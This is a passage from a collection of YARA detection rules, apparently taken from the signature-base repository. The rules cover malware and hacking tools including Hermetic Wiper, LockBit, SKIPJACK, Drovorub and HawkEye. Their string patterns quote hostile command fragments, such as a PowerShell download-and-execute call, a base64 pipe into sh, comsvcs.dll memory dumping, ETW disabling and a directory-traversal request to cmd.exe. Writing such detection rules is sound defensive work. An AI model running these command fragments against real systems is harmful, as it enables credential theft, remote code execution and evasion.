		$str8 = "%s%04x%s%s%s"
		$str9 = "Y2FwdGNoYV9zZXNzaW9u"
		$str10 = "utilities.EierKochen"
		$str11 = "kandidatKaufhaus"

	condition:
		3 of them
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Golang_Validalpha_Tasks_1
{
	meta:
		description = "Detects a variant of the GoLang Validalpha malware"
		author = "CISA.gov"
		id = "caa67a79-3ea6-5910-971c-f311722570ff"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L232-L247"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d3fb944888b289d345ffc8dfcc988abd04b8cabd1729a66e8236f95ee6147ee"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "main.ScreenMonitThread"
		$ = "main.CmdShell"
		$ = "main.GetAllFoldersAndFiles"
		$ = "main.SelfDelete"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_Hawkeye_Keylogger_Gen_Dec18_1
{
	meta:
		description = "Detects HawkEye Keylogger Reborn"
		author = "Florian Roth (Nextron Systems)"
		id = "1d06f364-a4e2-5632-ad3a-d53a8cddf072"
		date = "2018-12-10"
		modified = "2023-12-05"
		reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_hawkeye.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b850f02849030d9912b7571e33e969427ac8f721d2f288ae3ac3e971c4ee4263"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad"

	strings:
		$s1 = "HawkEye Keylogger" fullword wide
		$s2 = "_ScreenshotLogger" ascii
		$s3 = "_PasswordStealer" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_APT_RANSOM_Lockbit_Forensicartifacts_Nov23_1
{
	meta:
		description = "Detects patterns found in Lockbit TA attacks exploiting Citrixbleed vulnerability CVE 2023-4966"
		author = "Florian Roth"
		id = "04bde599-2a5b-5a33-a6f1-67d57a564946"
		date = "2023-11-22"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ransom_lockbit_citrixbleed_nov23.yar#L73-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ba1d47e2cac72143c4612c420777024f114afc007c7b15251a58819654aeff1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe"
		$x2 = " 1> \\\\127.0.0.1\\admin$\\__"

	condition:
		1 of ( $x* )
}

rule SIGNATURE_BASE_APT_APT28_Drovorub_Unique_Network_Comms_Strings_1
{
	meta:
		description = "Rule to detect Drovorub-server, Drovorub-agent, or Drovorub-client based"
		author = "NSA / FBI"
		id = "c6a930e8-c1c0-5d96-9051-7516df848b45"
		date = "2020-08-13"
		modified = "2023-12-05"
		reference = "https://www.nsa.gov/news-features/press-room/Article/2311407/nsa-and-fbi-expose-russian-previously-undisclosed-malware-drovorub-in-cybersecu/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt28_drovorub.yar#L44-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c82766b76c36fe64c6aa99577e1997d7181dbd36a4c27329845ae8a413f5327"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_01 = "action" wide ascii
		$s_02 = "auth.commit" wide ascii
		$s_03 = "auth.hello" wide ascii
		$s_04 = "auth.login" wide ascii
		$s_05 = "auth.pending" wide ascii
		$s_06 = "client_id" wide ascii
		$s_07 = "client_login" wide ascii
		$s_08 = "client_pass" wide ascii
		$s_09 = "clientid" wide ascii
		$s_10 = "clientkey_base64" wide ascii
		$s_11 = "file_list_request" wide ascii
		$s_12 = "module_list_request" wide ascii
		$s_13 = "monitor" wide ascii
		$s_14 = "net_list_request" wide ascii
		$s_15 = "server finished" wide ascii
		$s_16 = "serverid" wide ascii
		$s_17 = "tunnel" wide ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_Script_Obfuscation_Char_Concat_1
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "6d3bfdfd-ef8f-5740-ac1f-5835c7ce0f43"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L188-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "28b648e0e1c22fefa49a937f40bd4ed09c5d3894ff059979bad69e8bc98fcac2"
		score = 65
		quality = 85
		tags = ""
		hash1 = "b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b"

	strings:
		$s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Combo_1
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "1dfedcb0-345c-548c-85ac-3c1e78bfd9e2"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L202-L218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0a1507859354e0e0d9284befcf777c4d3883496eb96524a246a1df4f3a247aa9"
		score = 65
		quality = 85
		tags = ""
		hash1 = "13297f64a5f4dd9b08922c18ab100d3a3e6fdeab82f60a4653ab975b8ce393d5"

	strings:
		$x1 = "IEX ((new-object net.webclient).download" ascii nocase
		$fp1 = "chocolatey.org"
		$fp2 = "Remote Desktop in the Appveyor"
		$fp3 = "/appveyor/" ascii

	condition:
		$x1 and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Netsh_Portproxy_Command_1
{
	meta:
		description = "Detects a suspicious command line with netsh and the portproxy command"
		author = "Florian Roth (Nextron Systems)"
		id = "cbbd2042-572c-5283-bd45-e745b36733ad"
		date = "2019-04-20"
		modified = "2025-03-21"
		reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L295-L308"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "dbf82a908e77886af1c31c51f5f6684015cbcb22bf28876c2e1b0dd1ea5bd2b4"
		score = 65
		quality = 85
		tags = ""
		hash1 = "9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09"

	strings:
		$x1 = "netsh interface portproxy add v4tov4 listenport=" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Disable_ETW_Jun20_1_1
{
	meta:
		description = "Detects method to disable ETW in ENV vars before executing a program"
		author = "Florian Roth (Nextron Systems)"
		id = "ea5dee09-959e-5ef2-8f84-5497bdef0a05"
		date = "2020-06-06"
		modified = "2025-03-21"
		reference = "https://gist.github.com/Cyb3rWard0g/a4a115fd3ab518a0e593525a379adee3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L395-L413"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "182ad2512bcfbcd92d13380113b32982eb367e458019f07038a12f494dfbebb6"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "set COMPlus_ETWEnabled=0" ascii wide fullword
		$x2 = "$env:COMPlus_ETWEnabled=0" ascii wide fullword
		$s1 = "Software\\Microsoft.NETFramework" ascii wide
		$sa1 = "/v ETWEnabled" ascii wide fullword
		$sa2 = " /d 0" ascii wide
		$sb4 = "-Name ETWEnabled"
		$sb5 = " -Value 0 "

	condition:
		1 of ( $x* ) or 3 of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_SKIPJACK_1_1
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK installation script."
		author = "Mandiant"
		id = "0026375c-7f37-5ef9-bd55-5b9fc499e5d2"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L175-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e86c273a2b67a605f5d4686783e0cc"
		logic_hash = "8890cd9ab8190f12997e0653e43c89816df03c7bd41842e5ad21b1986819843e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'" base64
		$str2 = "hdr:body() ~= nil" base64
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
		$str4 = "openssl aes-256-cbc" base64
		$str5 = "mod_content.lua"
		$str6 = "#!/bin/sh"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SKIPJACK_2_1
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK samples."
		author = "Mandiant"
		id = "e1eac294-fe60-5bb2-bae4-0f7bcbe6b1db"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L195-L212"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87847445f9524671022d70f2a812728f"
		logic_hash = "093e8857c410bd30a076f87ef63d7e1e66f50e3dce75b4add67161782386ee24"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'"
		$str2 = "hdr:body() ~= nil"
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
		$str4 = "openssl aes-256-cbc"
		$str5 = "| base64 -d| sh 2>"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SEASPRAY_1_1
{
	meta:
		description = "Hunting rule looking for strings observed in SEASPRAY samples."
		author = "Mandiant"
		id = "8c744b85-b61e-56d0-8a9e-ae6a954e1b95"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L213-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35cf6faf442d325961935f660e2ab5a0"
		logic_hash = "856bfb47557b60f69aa1141477d6ce446ea13ebbe899022d7996ceef08bdefbb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "string.find(attachment:filename(),'obt075') ~= nil"
		$str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())"
		$str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Artefacts_Feb22_1_1
{
	meta:
		description = "Detects artefacts found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "77f793c1-b02c-59c3-b3e4-75758f5b3b8d"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L40-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5e917618a5172c68b4b32ba9e63402c2a98ccb027276b317ec169a4fef219de1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sx1 = "/c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump" ascii wide
		$sx2 = "appdata\\local\\microsoft\\windows\\winupd.log" ascii wide
		$sx3 = "AppData\\Local\\Microsoft\\Windows\\Winupd.log" ascii wide
		$sx4 = "CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1" ascii wide
		$sx5 = "\\policydefinitions\\postgresql.exe" ascii wide
		$sx6 = "powershell -v 2 -exec bypass -File text.ps1" ascii wide
		$sx7 = "powershell -exec bypass gp.ps1" ascii wide
		$sx8 = "powershell -exec bypass -File link.ps1" ascii wide
		$sx9 = " 1> \\\\127.0.0.1\\ADMIN$\\__16" ascii wide
		$sa1 = "(New-Object System.Net.WebClient).DownloadFile(" ascii wide
		$sa2 = "CSIDL_SYSTEM_DRIVE\\temp\\" ascii wide
		$sa3 = "1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$fp1 = "<html" ascii

	condition:
		1 of ( $sx* ) or all of ( $sa* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Scheduled_Task_Feb22_1_1
{
	meta:
		description = "Detects scheduled task pattern found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "a628f773-9c71-5979-a4db-37b6b6bd6a56"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L72-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56368ba1c97fe3455312b6ee86dcd1a21677f7dfa3836e76ada4b236a5b2c171"
		score = 85
		quality = 85
		tags = ""

	strings:
		$a0 = "<Task version=" ascii wide
		$sa1 = "CSIDL_SYSTEM_DRIVE\\temp" ascii wide
		$sa2 = "postgresql.exe 1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$sa3 = "cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE" ascii wide

	condition:
		$a0 and 1 of ( $s* )
}

rule SIGNATURE_BASE_Base64_PS1_Shellcode_1
{
	meta:
		description = "Detects Base64 encoded PS1 Shellcode"
		author = "Nick Carr, David Ledbetter"
		id = "7c3cec3b-a192-5bfd-b4f1-22b1afeb717e"
		date = "2018-11-14"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/1062601684566843392"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_ps1_shellcode.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fac6f41965eb2209f1552763800d6a2b172f28cd29bb7586d180654aab1e6d56"
		score = 65
		quality = 85
		tags = ""

	strings:
		$substring = "AAAAYInlM"
		$pattern1 = "/OiCAAAAYInlM"
		$pattern2 = "/OiJAAAAYInlM"

	condition:
		$substring and 1 of ( $p* )
}

rule SIGNATURE_BASE_APT_APT34_PS_Malware_Apr19_1_1
{
	meta:
		description = "Detects APT34 PowerShell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "6a082c5a-ee5b-5002-9148-61bbcfedfe68"
		date = "2019-04-17"
		modified = "2023-12-05"
		reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_oilrig.yar#L267-L283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afe203fdfcc9dcafb170bee972d45e66e5483a777112a00fa30516dfe81bbf88"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768"

	strings:
		$x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
		$x2 = "Write-Host \"excepton occured!\"" ascii
		$s1 = "Start-Sleep -s 1;" fullword ascii
		$s2 = "Start-Sleep -m 100;" fullword ascii

	condition:
		1 of ( $x* ) or 2 of them
}

rule SIGNATURE_BASE_Windowscredentialeditor_1
{
	meta:
		description = "Windows Credential Editor"
		author = "Florian Roth"
		id = "1542c6e4-36b2-5272-85d0-43226869b43e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L20-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "531a0bdc893d89b1c14deee11df95b430051cef07744a15b5d606e1c5378db97"
		score = 90
		quality = 85
		tags = ""
		threat_level = 10

	strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Portscanner_Simple_Jan14_1
{
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3e8960ce-0428-51e1-b992-4fa09fee8520"
		date = "2025-04-14"
		modified = "2025-04-14"
		old_rule_name = "PortScanner"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L171-L183"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b381b9212282c0c650cb4b0323436c63"
		logic_hash = "c69269b227d46b5b970cfc094b3154b0a533b439b8ed492a2059025bc96d17a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Moorer_Port_Scanner_1
{
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5d8fb83f-bed3-53d2-bd33-2158911dc7c8"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L204-L217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
		logic_hash = "248f437964fc6f7836f6b4c87e1f35bb1bac25a1a484cdf1a4065e7efb823b51"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"

	condition:
		all of them
}

rule SIGNATURE_BASE_Netbios_Name_Scanner_1
{
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "03716e00-a969-5ab5-9be7-e8fc4272e40f"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L219-L231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
		logic_hash = "19b40a283b74317fece2f5be0ee3e38227d9631eebbc7efb0ea19056b52630f1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgisscan_Cgiscan_1
{
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "60bd5038-a308-55fd-85bb-2c4183f1c951"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L247-L259"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "338820e4e8e7c943074d5a5bc832458a"
		logic_hash = "5bd856a77c53616cf78d093462f8b7ca5a5fb0924406a02941d86bdb015a1fbc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_IP_Stealing_Utilities_1
{
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a947e9c-d707-5819-88f2-059585750048"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L261-L272"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
		logic_hash = "38958edeee6e140e11267cdd7899ad517799dbce33ac267d51dea0f8aecfa1ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"

	condition:
		all of them
}

rule SIGNATURE_BASE_Superscan4_1
{
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "bd353382-ffa2-56c5-b842-1ffc94d6849e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L274-L287"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "78f76428ede30e555044b83c47bc86f0"
		logic_hash = "7f76c59e85efac5c150f783606e2a9bdc8724c6afd9f9c6405d63f7467c72752"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portracer_1
{
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "54717938-2f4c-5442-b0ad-40b9acd1101a"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L288-L300"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
		logic_hash = "f6ad85a8970b10e25becca76e17bff30cbc787ed45f331af4ecf9563ff11b65d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_1
{
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "dfc3ff29-03b4-58ca-bfe0-c6888fddab67"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L302-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
		logic_hash = "9400435470c26245cd814e1e39f275eb22566d66d1a72d4f3e618a6ad11bc8d9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"

	condition:
		all of them
}

rule SIGNATURE_BASE_Aolipsniffer_1
{
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "f7cc0f31-6ba4-504b-82de-0334257b8a95"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L314-L332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
		logic_hash = "e627b8ea85e4325714c98e93ad6147adfa600af548a80dce8548b7f5743733b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"

	condition:
		all of them
}

rule SIGNATURE_BASE__Bitchin_Threads__1
{
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a51e76c-b360-5f10-961c-ecc3ea3fa3c9"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L334-L345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
		logic_hash = "f43fec37d9dc668b562838465e5696e502c638b207e7af6a77fac5a8b00e92a8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgis4_Cgis4_1
{
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "98fbf445-b7a5-58fa-8f06-34be7321e2eb"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L347-L362"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
		logic_hash = "2cf3fc6447323cbefe5f5ad02271eeb4c271bb9784d2c29030858542a43fbb04"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portscan_1
{
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "967d6e3b-ae0d-5f93-a20d-742fc010608d"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L364-L375"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
		logic_hash = "d93b54ffc7416b5354304daf156908f11d7e320a91bd936e397a15ede63caae3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
